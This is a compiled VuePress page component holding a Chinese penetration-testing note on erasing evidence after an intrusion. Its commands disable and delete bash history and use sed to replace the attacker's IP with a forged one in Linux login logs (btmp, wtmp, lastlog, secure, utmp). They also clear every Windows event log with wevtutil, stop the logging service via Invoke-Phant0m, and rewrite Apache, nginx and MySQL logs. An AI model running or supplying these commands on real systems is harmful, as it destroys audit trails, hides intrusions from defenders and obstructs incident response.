import{_ as s}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as a,c as n,e}from"./app.f0041ddc.js";const t={},l=e(`<h2 id="linux日志处理" tabindex="-1"><a class="header-anchor" href="#linux日志处理" aria-hidden="true">#</a> Linux日志处理</h2><h3 id="bash日志处理" tabindex="-1"><a class="header-anchor" href="#bash日志处理" aria-hidden="true">#</a> Bash日志处理</h3><p>bash去掉history记录，让系统不记录history (只当前终端生效)</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">0</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILE</span></span><span class="token operator">=</span>/dev/null
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>history命令的清除，也是对~/.bash_history进行定向清除</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.bash_history<span class="token punctuation">;</span><span class="token function">history</span> <span class="token parameter variable">-c</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>恢复</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">1000</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILE</span></span><span class="token operator">=</span>/root/.bash_history
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><details class="custom-container details"><summary>Bash清理-登录第一步</summary><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> ~/.bash_history <span class="token operator">&gt;</span> /tmp/120240107.txt
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">0</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">HISTFILE</span></span><span class="token operator">=</span>/dev/null
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> ~/.bash_history<span class="token punctuation">;</span><span class="token function">history</span> <span class="token parameter variable">-c</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><h3 id="系统日志" tabindex="-1"><a class="header-anchor" href="#系统日志" aria-hidden="true">#</a> 系统日志</h3><p>直接将日志清除过于明显，一般使用sed进行定向清除或伪造</p><table><thead><tr><th><strong>日志文件</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>/var/log/btmp</strong></td><td>记录错误登录（登陆失败）日志；使用lastb命令查看</td></tr><tr><td><strong>/var/log/lastlog</strong></td><td>记录系统中所有用户最后一次成功登录时间，使用lastlog命令查看</td></tr><tr><td><strong>/var/log/wtmp</strong></td><td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用last命令来查看</td></tr><tr><td><strong>/run/utmp</strong></td><td>只记录当前登录用户的信息；使用w,who,users等命令来查询</td></tr><tr><td><strong>/var/log/secure</strong></td><td>记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码（Centos）</td></tr></tbody></table><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#SSH登录日志清理</span>
<span class="token comment">#其中前边是我们的IP，127.0.0.1是伪造的IP，-i直接编辑文件，必须在后边</span>

<span class="token function">cat</span> <span class="token operator">&gt;</span> /tmp/clog.sh <span class="token operator">&lt;&lt;</span><span class="token string">EOF
sed &#39;s/1.1.1.1/127.0.0.1/g&#39; -i /var/log/btmp*
sed &#39;s/1.1.1.1/127.0.0.1/g&#39; -i /var/log/lastlog
sed &#39;s/1.1.1.1/127.0.0.1/g&#39; -i /var/log/wtmp
sed &#39;s/1.1.1.1/127.0.0.1/g&#39; -i /var/log/secure
sed &#39;s/1.1.1.1/127.0.0.1/g&#39; -i /run/utmp
rm -f /tmp/clog.sh
EOF</span>
<span class="token function">sh</span> /tmp/clog.sh<span class="token punctuation">;</span><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/clog.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="windows日志处理" tabindex="-1"><a class="header-anchor" href="#windows日志处理" aria-hidden="true">#</a> Windows日志处理</h2><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义</p><table><thead><tr><th><strong>事件ID</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>4648</td><td>登录成功，会记录登录来源IP</td></tr><tr><td>4625</td><td>登录失败，会记录登录来源IP</td></tr><tr><td>4672</td><td>使用超级用户（如管理员）进行特殊登录，不会记录IP</td></tr><tr><td>4720</td><td>创建用户</td></tr><tr><td>4733</td><td>从用户组删除用户</td></tr><tr><td>4779</td><td>注销事件，会记录登录来源IP</td></tr></tbody></table><h3 id="一、wevtutil-for循环清除所有日志" tabindex="-1"><a class="header-anchor" href="#一、wevtutil-for循环清除所有日志" aria-hidden="true">#</a> 一、wevtutil+for循环清除所有日志</h3><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token keyword">for</span> <span class="token operator">/</span>F <span class="token string">&quot;tokens=*&quot;</span> <span class="token operator">%</span>a in <span class="token punctuation">(</span><span class="token string">&#39;wevtutil.exe el&#39;</span><span class="token punctuation">)</span> <span class="token keyword">DO</span> wevtutil<span class="token punctuation">.</span>exe cl <span class="token string">&quot;%a&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="二、-ps批量删日志" tabindex="-1"><a class="header-anchor" href="#二、-ps批量删日志" aria-hidden="true">#</a> 二、 ps批量删日志</h3><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token function">PS</span> C:\\&gt; wevtutil el <span class="token punctuation">|</span> <span class="token function">Foreach-Object</span> <span class="token punctuation">{</span><span class="token function">Write-Host</span> <span class="token string">&quot;Clearing <span class="token variable">$_</span>&quot;</span><span class="token punctuation">;</span> wevtutil cl <span class="token string">&quot;<span class="token variable">$_</span>&quot;</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="三、运行ps脚本" tabindex="-1"><a class="header-anchor" href="#三、运行ps脚本" aria-hidden="true">#</a> 三、运行ps脚本</h3><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>powershell –exec bypass –Command <span class="token string">&quot;&amp; {Import-Module &#39;C:\\Invoke-Phant0m.ps1&#39;;Invoke-Phant0m}&quot;</span>

<span class="token comment">#win日志服务此时就会停止工作了</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不过这种方法太过暴力，而且停止日志记录这个方法停止后无法恢复，稳妥点还是手动删除登录事件</p><h2 id="web日志处理" tabindex="-1"><a class="header-anchor" href="#web日志处理" aria-hidden="true">#</a> Web日志处理</h2><p>如apache的access.log,error.log</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/apache/access.log
<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/apache/error_log
<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/apache/php_error.log
<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/apache/php_error.log
<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/nginx/access.log

<span class="token comment">#其中192.168.1.3是我们的IP，8.8.8.8是我们伪造的IP</span>

<span class="token comment">#可以搜索一下Web日志的位置</span>
<span class="token function">find</span> / <span class="token parameter variable">-name</span> access.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="mysql日志文件" tabindex="-1"><a class="header-anchor" href="#mysql日志文件" aria-hidden="true">#</a> MySQL日志文件</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>log-error<span class="token operator">=</span>/var/log/mysql/mysql_error.log    <span class="token comment">#错误日志</span>
log-slow-queries<span class="token operator">=</span>/var/log/mysql/mysql_slow.log <span class="token comment">#慢查询日志</span>

<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/mysql/mysql_error.log
<span class="token function">sed</span> <span class="token string">&#39;s/192.168.1.3/8.8.8.8/g&#39;</span> –i /var/log/mysql/mysql_slow.log
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,28),i=[l];function r(o,d){return a(),n("div",null,i)}const u=s(t,[["render",r],["__file","清理战场反溯源-日志处理.html.vue"]]);export{u as default};
